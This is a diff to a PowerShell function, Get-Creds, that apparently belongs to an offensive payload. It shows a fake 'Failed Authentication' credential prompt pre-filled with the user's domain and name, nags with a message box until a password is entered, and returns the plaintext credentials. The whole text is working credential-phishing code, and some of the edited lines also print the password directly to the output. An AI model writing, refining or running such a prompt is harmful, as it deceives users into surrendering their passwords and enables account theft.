@@ -57,15 +57,14 @@ function Get-Creds {
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName)); 
-        $password = $cred.getnetworkcredential().password
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
 
-        if([string]::IsNullOrWhiteSpace($password))
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
         {
             if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
             {
-                Add-Type -AssemblyName PresentationCore
-                Add-Type -AssemblyName PresentationFramework
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
             }
 
             $msgBody = "Credentials cannot be empty!"
@@ -74,12 +73,12 @@ function Get-Creds {
             $msgImage = 'Stop'
             $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
             Write-Host "The user clicked: $Result"
-          
+            $form = $null
         }
         
         else{
-            $creds = $cred.GetNetworkCredential()
-            Write-Output $creds
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
         }
     }
 }
